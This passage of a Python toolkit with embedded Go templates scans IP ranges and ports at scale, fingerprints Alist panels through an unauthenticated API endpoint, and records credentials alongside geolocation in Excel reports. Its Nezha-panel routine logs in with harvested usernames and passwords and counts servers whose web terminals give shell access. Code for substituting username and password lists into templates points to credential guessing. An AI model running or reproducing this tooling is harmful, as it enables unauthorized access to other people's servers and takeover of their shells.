    "	body, readErr := ioutil.ReadAll(resp.Body)",
    "	if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }",
    "	proxyIP := string(body)",
    "	// 解析返回的IP地址",
    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
    "		parts := strings.Split(proxyIP, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			proxyIP = ipParts[0]",
    "		}",
    "	}",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
    "	// 如果代理返回的IP和本机IP相同，则为透明代理，视为无效",
    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }",
    "	return true, nil",
    "}",
    "// main 函数是程序的入口",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	var err error",
    "	// 首先获取本机IP",
    "	realIP, err = getPublicIP(testURL)",
    "	if err != nil {",
    "		realIP = \"UNKNOWN\" // 如果失败，则无法检测透明代理",
    "	}",
    "	proxies, err := os.Open(inputFile)",
    "	if err != nil {",
    "		return",
    "	}",
    "	defer proxies.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(proxies)",
    "	for scanner.Scan() {",
    "		proxyAddr := strings.TrimSpace(scanner.Text())",
    "		if proxyAddr != \"\" { tasks <- proxyAddr }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]
# Alist 面板扫描模板
ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "// createHttpClient 创建一个具有特定超时和安全设置的HTTP客户端",
    "func createHttpClient() *http.Client {",
    "	tr := &http.Transport{",
    "		Proxy: http.ProxyFromEnvironment,",
    "		DialContext: (&net.Dialer{",
    "			Timeout:   {timeout} * time.Second, // 连接超时",
    "			KeepAlive: 0, // 禁用KeepAlive",
    "		}).DialContext,",
    "		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // 跳过证书验证",
    "		TLSHandshakeTimeout:   {timeout} * time.Second, // TLS握手超时",
    "		ResponseHeaderTimeout: {timeout} * time.Second, // 响应头超时",
    "		ExpectContinueTimeout: 1 * time.Second,",
    "		ForceAttemptHTTP2:     false,",
    "		DisableKeepAlives: true, // 明确禁用长连接",
    "	}",
    "	return &http.Client{",
    "		Transport: tr,",
    "		Timeout:   ({timeout} + 1) * time.Second, // 客户端总超时",
    "	}",
    "}",
    "// worker 从任务通道接收IP，并交由 processIP 处理",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	httpClient := createHttpClient() // 每个 worker 有自己的客户端",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, file, httpClient)",
    "	}",
    "}",
    "// processIP 针对单个IP，尝试HTTP和HTTPS协议",
    "func processIP(ipPort string, file *os.File, httpClient *http.Client) {",
    "	parts := strings.SplitN(ipPort, \":\", 2)",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	// 遍历 http 和 https 两种协议",
    "	for _, proto := range []string{\"http\", \"https\"} {",
    "		base := fmt.Sprintf(\"%s://%s:%s\", proto, ip, port)",
    "		// Alist 的一个通用未授权API端点",
    "		testURL := base + \"/api/me\"",
    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil)",
    "		if err != nil { cancel(); continue }",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "		req.Header.Set(\"Connection\", \"close\") // 明确要求关闭连接",
    "		resp, err := httpClient.Do(req)",
    "       cancel()",
    "		if err != nil {",
    "			if resp != nil { resp.Body.Close() }",
    "			continue",
    "		}",
    "		// 验证响应是否符合Alist面板的特征",
    "		if isValidResponse(resp) {",
    "			file.WriteString(base + \"\\n\")",
    "			resp.Body.Close()",
    "			return // 找到即返回",
    "		}",
    "		resp.Body.Close()",
    "	}",
    "}",
    "// isValidResponse 检查HTTP响应是否是Alist面板的有效响应",
    "func isValidResponse(resp *http.Response) bool {",
    "	if resp == nil { return false }",
    "	// 限制读取大小防止内存攻击",
    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
    "	if err != nil { return false }",
    "	var data map[string]interface{}",
    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
    "	// 关键检查：JSON响应中 'code' 字段的值是否为 200",
    "	if v, ok := data[\"code\"]; ok {",
    "		switch t := v.(type) {",
    "		case float64:",
    "			return int(t) == 200",
    "		case string:",
    "			return t == \"200\"",
    "		}",
    "	}",
    "	return false",
    "}",
    "// main 函数是程序的入口",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" {",
    "			// 兼容多种输入格式，只取第一个字段（IP:Port）",
    "			fields := strings.Fields(line)",
    "			if len(fields) > 0 {",
    "				tasks <- fields[0]",
    "			}",
    "		}",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# TCP 端口活性测试模板 (主模式，写文件)
TCP_ACTIVE_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		ipPort := strings.TrimSpace(line)",
    "		if _, _, err := net.SplitHostPort(ipPort); err != nil { continue }",
    "		conn, err := net.DialTimeout(\"tcp\", ipPort, {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			file.WriteString(ipPort + \"\\n\")",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# TCP 端口活性测试模板 (预扫描模式，带进度反馈)
TCP_PRESCAN_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		ipPort := strings.TrimSpace(line)",
    "		if _, _, err := net.SplitHostPort(ipPort); err != nil {",
    "			fmt.Println(\"FAIL:\" + ipPort)",
    "			continue",
    "		}",
    "		conn, err := net.DialTimeout(\"tcp\", ipPort, {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			fmt.Println(\"SUCCESS:\" + ipPort)",
    "		} else {",
    "			fmt.Println(\"FAIL:\" + ipPort)",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 2 { os.Exit(1) }",
    "	inputFile := os.Args[1]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { tasks <- strings.TrimSpace(scanner.Text()) }",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]


# =========================== 新增: 子网TCP扫描模板 ===========================
SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
    "package main",
    "",
    "import (",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "",
    "// inc increments an IP address.",
    "func inc(ip net.IP) {",
    "	for j := len(ip) - 1; j >= 0; j-- {",
    "		ip[j]++",
    "		if ip[j] > 0 {",
    "			break",
    "		}",
    "	}",
    "}",
    "",
    "// worker scans a single IP address.",
    "func worker(ip net.IP, port string, timeout time.Duration, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	target := fmt.Sprintf(\"%s:%s\", ip.String(), port)",
    "	conn, err := net.DialTimeout(\"tcp\", target, timeout)",
    "	if err == nil {",
    "		conn.Close()",
    "		file.WriteString(target + \"\\n\")",
    "	}",
    "}",
    "",
    "func main() {",
    "	if len(os.Args) < 5 {",
    "		fmt.Println(\"Usage: ./subnet_scanner <cidr> <port> <outputFile> <concurrency>\")",
    "		os.Exit(1)",
    "	}",
    "	cidr := os.Args[1]",
    "	port := os.Args[2]",
    "	outputFile := os.Args[3]",
    "   concurrency := 0",
    "   fmt.Sscanf(os.Args[4], \"%d\", &concurrency)",
    "",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "",
    "	ip, ipnet, err := net.ParseCIDR(cidr)",
    "	if err != nil {",
    "		fmt.Println(\"无效的CIDR:\", err)",
    "		return",
    "	}",
    "",
    "	var wg sync.WaitGroup",
    "   sem := make(chan struct{}, concurrency)",
    "",
    "	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {",
    "       sem <- struct{}{}",
    "		wg.Add(1)",
    "		go func(ipCopy net.IP) {",
    "			worker(ipCopy, port, 3*time.Second, outFile, &wg)",
    "           <-sem",
    "		}(append(net.IP(nil), ip...))",
    "	}",
    "",
    "	wg.Wait()",
    "}",
]


# =========================== ipcx.py 内容 (增加tqdm风格进度条和批量查询) ===========================
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
import json
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
from tqdm import tqdm

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    # 这个正则表达式旨在从各种URL格式中找到核心的ip:port或domain:port
    # 它可以处理 http://user:pass@ip:port/path -> ip:port
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match:
        return match.group(3)
    
    # 备用方案，用于简单的ip:port或domain:port
    match = re.search(r'([^:/\s]+:\d+)', url)
    if match:
        return match.group(1)
        
    # 如果行中没有端口，则备用方案仅用于ip/域
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
    if match:
        return match.group(3)

    return url.split()[0]

def get_ip_info_batch(ip_list, retries=3):
    # 批量查询ip-api.com，每次最多100个。
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    results = {}
    
    # 准备ip-api的有效负载，仅提取IP/域部分
    payload = []
    for ip_port in ip_list:
        ip = ip_port.split(':')[0]
        payload.append({"query": ip})

    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, timeout=20)
            response.raise_for_status()
            data = response.json()
            for item in data:
                # 从输入列表中找到与查询匹配的原始ip_port
                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                if original_ip_port:
                    if item.get('status') == 'success':
                        results[original_ip_port] = [
                            original_ip_port,
                            item.get('country', 'N/A'),
                            item.get('regionName', 'N/A'),
                            item.get('city', 'N/A'),
                            item.get('isp', 'N/A')
                        ]
                    else:
                         results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
            # 填入原始列表中任何缺失的结果（例如，如果某些API调用失败）
            for ip_port in ip_list:
                if ip_port not in results:
                    results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
            # 按与输入列表相同的顺序返回结果
            return [results[ip_port] for ip_port in ip_list]
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                # 最终失败时，为批处理中的所有内容返回N/A
                return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
    
    # 如果循环完成但未返回，则备用
    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        try:
            os.remove(output_excel)
        except OSError as e:
            print("无法删除旧的Excel文件 '{}': {}。请手动关闭它。".format(output_excel, e))
            return

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    # 准备批处理数据
    targets = []
    for line in lines:
        addr, user, passwd = line, '', ''
        try:
            # 优先匹配协议头，以正确处理包含@符号的用户名/密码
            proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
            if proxy_match:
                # protocol = proxy_match.group(1) # http:// or https://
                user = proxy_match.group(2) or ''
                passwd = proxy_match.group(3) or ''
                addr = "{}{}".format(proxy_match.group(1), proxy_match.group(4)) # 重新组合地址部分
            else:
                # 如果没有协议头，使用空格分割
                parts = line.split()
                if len(parts) >= 3:
                    addr, user, passwd = parts[0], parts[1], parts[2]
                elif len(parts) == 2:
                    addr, user = parts[0], parts[1]
                else:
                    addr = parts[0]
        except Exception:
             addr = line.split()[0] if line.split() else ''
        
        ip_port = extract_ip_port(addr)
        if ip_port:
            targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})

    # 分块处理
    chunk_size = 100  # ip-api.com 批处理限制
    
    with tqdm(total=len(targets), desc="[📊] IP信息查询", unit="ip", ncols=100) as pbar:
        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i+chunk_size]
            ip_ports_in_chunk = [target['ip_port'] for target in chunk]
            
            batch_results = get_ip_info_batch(ip_ports_in_chunk)
            
            wb = load_workbook(output_excel)
            ws = wb.active
            
            for original_target, result_data in zip(chunk, batch_results):
                row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                ws.append(row)
            
            wb.save(output_excel)
            pbar.update(len(chunk))
            
            # ip-api.com 允许每分钟15个批处理请求。60/15 = 每个请求4秒。
            if i + chunk_size < len(targets):
                time.sleep(4.5)

    # 最后一次性调整宽度
    wb = load_workbook(output_excel)
    ws = wb.active
    adjust_column_width(ws)
    wb.save(output_excel)
    print("\nIP信息查询完成！")


if __name__ == "__main__":
    if len(sys.argv) > 2:
        process_ip_port_file(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python ipcx.py <input_file> <output_file>")
"""

def generate_ipcx_py():
    """
    将存储在 IPCX_PY_CONTENT 变量中的内容写入到 ipcx.py 文件中。
    """
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

# =========================== 新增哪吒面板分析函数 ===========================
def debug_log(message, level="INFO"):
    colors = {
        "INFO": "\033[94m",
        "SUCCESS": "\033[92m",
        "WARNING": "\033[93m",
        "ERROR": "\033[91m",
        "ENDC": "\033[0m"
    }
    print("[{}] {}{}{}".format(level, colors.get(level, ''), message, colors['ENDC']))

def check_server_terminal_status(session, base_url, server_id):
    # 检测单台服务器的终端连接状态
    try:
        terminal_paths = [
            "/dashboard/terminal/{}".format(server_id), "/dashboard/ssh/{}".format(server_id),
            "/dashboard/console/{}".format(server_id), "/dashboard/shell/{}".format(server_id),
            "/terminal/{}".format(server_id), "/ssh/{}".format(server_id),
            "/console/{}".format(server_id), "/shell/{}".format(server_id)
        ]
        for path in terminal_paths:
            try:
                res = session.get(base_url + path, timeout=5, verify=False)
                if res.status_code == 200:
                    content = res.text.lower()
                    has_xterm = "xterm" in content
                    has_errors = any(error in content for error in [
                        "not found", "404", "error", "failed", "unavailable", "未找到", 
                        "错误", "失败", "不可用", "服务器不存在", "尚未连接", "terminal not available"
                    ])
                    if has_xterm and not has_errors:
                        return True
            except Exception:
                continue
        try:
            res = session.get(base_url + "/dashboard", timeout=5, verify=False)
            if res.status_code == 200:
                content = res.text.lower()
                if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                    return True
        except Exception:
            pass
    except Exception:
        return False
    return False

def count_terminal_accessible_servers(session, base_url):
    # 统计终端畅通的服务器数量
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code != 200:
            return 0, []
        
        data = res.json()
        servers = []
        
        if isinstance(data, dict) and "error" in data and "unauthorized" in data.get("error", "").lower():
            return check_terminal_status_via_pages(session, base_url)
        
        if isinstance(data, list):
            servers = data
        elif isinstance(data, dict) and "data" in data:
            servers = data["data"]
        
        if not servers:
            return 0, []
        
        count = 0
        accessible_servers = []
        for server in servers:
            if isinstance(server, dict) and "id" in server:
                server_id = server["id"]
                server_name = server.get("name", "Server-{}".format(server_id))
                if check_server_terminal_status(session, base_url, server_id):
                    count += 1
                    accessible_servers.append({"id": server_id, "name": server_name, "status": "终端畅通"})
        return count, accessible_servers
    except Exception:
        return 0, []

def check_terminal_status_via_pages(session, base_url):
    # API未授权时的备用检测方案
    try:
        res = session.get(base_url + "/dashboard", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            content = res.text.lower()
            if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                return 1, [{"id": "unknown", "name": "Dashboard", "status": "终端畅通"}]
        return 0, []
    except Exception:
        return 0, []

def check_for_agents_and_terminal(session, base_url):
    # 检查机器数量和终端状态
    total_servers = 0
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, list):
                total_servers = len(data)
            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list):
                total_servers = len(data["data"])
    except Exception:
        pass
    
    has_agents = total_servers > 0
    if not has_agents:
        return False, 0, 0, []
    
    terminal_accessible_count, terminal_accessible_servers = count_terminal_accessible_servers(session, base_url)
    return has_agents, terminal_accessible_count, total_servers, terminal_accessible_servers

def analyze_panel(result_line):
    # 多线程分析函数
    parts = result_line.split()
    if len(parts) < 3:
        return result_line, (0, 0, "格式错误")

    ip_port, username, password = parts[0], parts[1], parts[2]
    
    for protocol in ["http", "https"]:
        base_url = "{}://{}".format(protocol, ip_port)
        session = requests.Session()
        login_url = base_url + "/api/v1/login"
        payload = {"username": username, "password": password}
        
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            
            if res.status_code == 200:
                try:
                    j = res.json()
                    is_login_success = False
                    auth_token = None

                    if "token" in j.get("data", {}):
                        auth_token = j["data"]["token"]
                        is_login_success = True
                    if "nz-jwt" in res.headers.get("Set-Cookie", ""):
                        is_login_success = True
                    if j.get("code") == 200 and j.get("message", "").lower() == "success":
                        is_login_success = True

                    if is_login_success:
                        if auth_token:
                            session.headers.update({"Authorization": "Bearer {}".format(auth_token)})
                        
                        _, term_count, machine_count, term_servers = check_for_agents_and_terminal(session, base_url)
                        
                        server_names = [s.get('name', s.get('id', '')) for s in term_servers]
                        servers_string = ", ".join(map(str, server_names)) if server_names else "无"
                        
                        return result_line, (machine_count, term_count, servers_string)
                except json.JSONDecodeError:
                    if "oauth2" in res.text.lower():
                        return result_line, (0, 0, "登录页面")
                    return result_line, (0, 0, "分析失败")
                except Exception as e:
                    debug_log("分析时出错 {}: {}".format(base_url, e), "ERROR")
                    return result_line, (0, 0, "分析失败")
        except requests.exceptions.RequestException:
            continue
            
    return result_line, (0, 0, "登录失败")

# =========================== 主脚本优化部分 ===========================
# 定义Go可执行文件的绝对路径
GO_EXEC = "/usr/local/go/bin/go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    # 将哪吒面板的分析结果更新到已生成的Excel文件中
    if not os.path.exists(xlsx_file):
        print("⚠️  Excel文件 {} 不存在，跳过更新。".format(xlsx_file))
        return

    try:
        wb = load_workbook(xlsx_file)
        ws = wb.active

        # 添加新的表头
        server_count_col = ws.max_column + 1
        terminal_count_col = ws.max_column + 2
        terminal_list_col = ws.max_column + 3
        
        ws.cell(row=1, column=server_count_col, value="服务器总数")
        ws.cell(row=1, column=terminal_count_col, value="终端畅通数")
        ws.cell(row=1, column=terminal_list_col, value="畅通服务器列表")

        # 遍历每一行，更新数据
        for row_idx in range(2, ws.max_row + 1):
            original_address = ws.cell(row=row_idx, column=1).value
            if original_address in analysis_data:
                analysis_result = analysis_data[original_address]
                if len(analysis_result) == 3:
                    machine_count, term_count, servers_string = analysis_result
                    ws.cell(row=row_idx, column=server_count_col, value=machine_count)
                    ws.cell(row=row_idx, column=terminal_count_col, value=term_count)
                    ws.cell(row=row_idx, column=terminal_list_col, value=servers_string)
        
        wb.save(xlsx_file)
        print("✅ 成功将哪吒面板分析结果写入Excel报告。")
    except Exception as e:
        print("❌ 更新Excel文件时发生错误: {}".format(e))


def input_with_default(prompt, default):
    user_input = input("{} (默认: {})：".format(prompt, default)).strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input("{} (默认: {})：".format(prompt, default)).strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(go_file_name, template_lines, **kwargs):
    code = "\n".join(template_lines)

    # 替换通用占位符
    if '{timeout}' in code:
        code = code.replace("{timeout}", str(kwargs.get('timeout', 3)))
    if '{semaphore_size}' in code:
        code = code.replace("{semaphore_size}", str(kwargs.get('semaphore_size', 100)))

    # 替换特定模板的占位符 (BUG修复)
    if 'usernames' in kwargs and '{user_list}' in code:
        user_list_str = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(u)) for u in kwargs['usernames']]) + "}"
        code = code.replace("{user_list}", user_list_str)
    if 'passwords' in kwargs and '{pass_list}' in code:
        pass_list_str = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(p)) for p in kwargs['passwords']]) + "}"
        code = code.replace("{pass_list}", pass_list_str)

    if 'proxy_type' in kwargs and '{proxy_type}' in code:
        creds_list_str = "[]string{" + ", ".join(['"{}"'.format(escape_go_string(line)) for line in kwargs.get('credentials', [])]) + "}"
        code = code.replace("{proxy_type}", kwargs['proxy_type']) \
                   .replace("{auth_mode}", str(kwargs.get('auth_mode', 0))) \
                   .replace("{creds_list}", creds_list_str)
        if 'test_url' in kwargs:
            escaped_url = escape_go_string(kwargs['test_url'])
            code = code.replace("testURL      = \"http://myip.ipip.net\"", f'testURL      = "{escaped_url}"')

    with open(go_file_name, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(code)


def compile_go_program(go_file, executable_name):
    if sys.platform == "win32":
        executable_name += ".exe"

    print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_name}...")
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        process = subprocess.Popen(
            [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, go_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=go_env
        )
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build'], stdout, stderr.decode('utf-8', 'ignore'))
        
        if stderr:
            print(f"   - ⚠️  Go编译器警告: {stderr.decode('utf-8', 'ignore')}")
        print(f"✅ [编译] Go程序编译成功: {executable_name}")
        return executable_name
    except subprocess.CalledProcessError as e:
        print(f"❌ [编译] Go程序 {go_file} 编译失败!")
        print(f"   - 返回码: {e.returncode}")
        print(f"   - 错误输出:\n{e.stderr}")
        print("   - 请检查Go环境和代码。")
        return None

def adjust_oom_score():
    if sys.platform != "linux":
        return
    
    try:
        pid = os.getpid()
        oom_score_adj_path = "/proc/{}/oom_score_adj".format(pid)
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f:
                f.write("-500")
            print("✅ [系统] 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError:
        print("⚠️  [系统] 调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e:
        print("⚠️  [系统] 调整OOM Score时发生未知错误: {}".format(e))

def check_and_manage_swap():
    if sys.platform != "linux":
        return

    try:
        swap_info = psutil.swap_memory()
        if swap_info.total > 0:
            print(f"✅ [系统] 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。")
            return

        total_mem_gb = psutil.virtual_memory().total / (1024**3)
        recommended_swap_gb = 0
        if total_mem_gb < 2:
            recommended_swap_gb = 2
        elif 2 <= total_mem_gb <= 8:
            recommended_swap_gb = int(total_mem_gb / 2) if int(total_mem_gb / 2) > 1 else 2
        elif 8 < total_mem_gb <= 32:
            recommended_swap_gb = 4
        else: # > 32GB
            recommended_swap_gb = 8

        print(f"⚠️  [系统] 警告：未检测到活动的Swap交换空间。您的内存为 {total_mem_gb:.2f} GB。")
        choice = input(f"❓ 是否要创建一个 {recommended_swap_gb}GB 的临时Swap文件来提高稳定性？(y/N): ").strip().lower()
        
        if choice == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"   - 正在创建 {recommended_swap_gb}GB Swap文件: {swap_file} (可能需要一些时间)...")
            
            try:
                if shutil.which("fallocate"):
                    subprocess.run(["fallocate", "-l", f"{recommended_swap_gb}G", swap_file], check=True)
                else:
                    count = recommended_swap_gb * 1024
                    subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", f"count={count}"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                subprocess.run(["chmod", "600", swap_file], check=True)
                subprocess.run(["mkswap", swap_file], check=True)
                subprocess.run(["swapon", swap_file], check=True)
                
                atexit.register(cleanup_swap, swap_file)
                
                print(f"✅ [系统] 成功创建并启用了 {recommended_swap_gb}GB Swap文件: {swap_file}")
                print("   - 该文件将在脚本退出时自动被禁用和删除。")
            except Exception as e:
                print(f"❌ [系统] Swap文件创建失败: {e}")
                print("   - 请检查权限和磁盘空间。脚本将继续运行，但稳定性可能受影响。")

    except Exception as e:
        print(f"❌ [系统] Swap检查失败: {e}")

def cleanup_swap(swap_file):
    print("\n   - 正在禁用和清理临时Swap文件: {} ...".format(swap_file))
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ [系统] 临时Swap文件已成功清理。")
    except Exception as e:
        print("⚠️  [系统] 清理Swap文件失败: {}".format(e))

# ==================== 全新执行模型 ====================
def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency):
    """
    处理单个IP块的函数，由Python的线程池调用。
    """
    input_file = os.path.join(TEMP_PART_DIR, "input_{}.txt".format(chunk_id))
    output_file = os.path.join(TEMP_XUI_DIR, "output_{}.txt".format(chunk_id))

    with open(input_file, 'w', encoding='utf-8') as f:
        f.write("\n".join(lines))

    try:
        # 为每个Go进程设置内存限制
        run_env = os.environ.copy()
        total_memory = psutil.virtual_memory().total
        mem_limit = int(total_memory * 0.70 / 1024 / 1024) # 70% of total RAM in MiB
        run_env["GOMEMLIMIT"] = "{}MiB".format(mem_limit)
        run_env["GOGC"] = "50" # 更积极的垃圾回收

        cmd = ['./' + executable_name, input_file, output_file]
        
        # 死锁修复：将 stderr 合并到 stdout
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=run_env)

        # 实时读取合并后的输出流（字节流）并解码
